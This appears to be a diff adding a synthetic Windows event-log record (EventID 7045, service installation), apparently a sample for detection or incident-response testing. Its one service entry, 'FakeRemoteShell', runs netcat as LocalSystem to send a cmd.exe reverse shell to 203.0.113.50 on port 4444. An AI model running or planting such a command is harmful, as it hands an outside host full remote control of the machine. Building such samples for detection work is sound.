@@ -1,0 +1,14 @@
+{
+  "EventID": 7045,
+  "LogName": "System",
+  "Source": "Service Control Manager",
+  "Date": "2025-07-06T15:25:00Z",
+  "Computer": "SERVER01.corp.local",
+  "ServiceInformation": {
+    "ServiceName": "FakeRemoteShell",
+    "ImagePath": "C:\\Windows\\Temp\\nc.exe -e cmd.exe 203.0.113.50 4444",
+    "ServiceType": "user mode service",
+    "StartType": "demand start",
+    "AccountName": "LocalSystem"
+  }
+}
